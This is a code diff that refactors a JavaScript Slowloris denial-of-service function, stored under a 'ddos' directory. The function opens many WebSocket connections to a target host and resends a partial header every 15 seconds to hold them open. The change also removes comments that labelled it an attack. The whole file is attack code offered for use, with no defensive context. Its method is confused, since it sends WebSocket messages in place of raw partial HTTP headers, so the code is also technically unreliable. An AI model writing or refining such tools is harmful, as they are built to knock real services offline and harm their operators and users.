@@ -1,47 +1,50 @@
 // main/ddos/slowloris.js
-// Slowloris attack implementation
-
 function slowloris(target, numSockets) {
   if (!target) {
-    console.error("Target URL is required for Slowloris attack.");
+    console.error("Target URL is required.");
     return;
   }
 
+  const parsedTarget = new URL(target);
+  const hostname = parsedTarget.hostname;
+  const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
+  const isSecure = parsedTarget.protocol === 'https:';
+
   if (!numSockets || numSockets <= 0) {
-    numSockets = 100; // Default number of sockets
+    numSockets = 200;
   }
 
-  console.log(`Initiating Slowloris attack against ${target} using ${numSockets} sockets.`);
+  console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);
 
   for (let i = 0; i < numSockets; i++) {
-    try {
-      const socket = new WebSocket(target); // Use WebSocket for persistent connection
+    createSocket(hostname, port, i, isSecure);
+  }
 
-      socket.onopen = () => {
-        console.log(`Socket ${i + 1} opened.`);
+  function createSocket(hostname, port, index, isSecure) {
+    const socket = new WebSocket((isSecure ? 'wss://' : 'ws://') + hostname + ':' + port);
+
+    socket.onopen = () => {
+      console.log(`Socket ${index + 1} opened.`);
+      sendPartialHeader(socket);
+      setInterval(() => {
         sendPartialHeader(socket);
-        setInterval(() => {
-          sendPartialHeader(socket);
-        }, 15); // Send partial header every 15 seconds to keep connection alive
-      };
+      }, 15000);
+    };
 
-      socket.onclose = () => {
-        console.log(`Socket ${i + 1} closed.`);
-      };
+    socket.onclose = () => {
+      console.log(`Socket ${index + 1} closed.`);
+    };
 
-      socket.onerror = (error) => {
-        console.error(`Socket ${i + 1} error: ${error}`);
-      };
-    } catch (error) {
-      console.error(`Failed to create socket ${i + 1}: ${error}`);
-    }
+    socket.onerror = (error) => {
+      console.error(`Socket ${index + 1} error: ${error}`);
+      socket.close();
+    };
   }
 
   function sendPartialHeader(socket) {
-    const partialHeader = "X-Custom-Header: keep-alive\r\n"; // Modified header
+    const partialHeader = "X-Custom-Header: keep-alive\r\n";
     try {
       socket.send(partialHeader);
-      // console.log("Partial header sent."); // Keep it quiet
     } catch (error) {
       console.error("Error sending partial header:", error);
       socket.close();
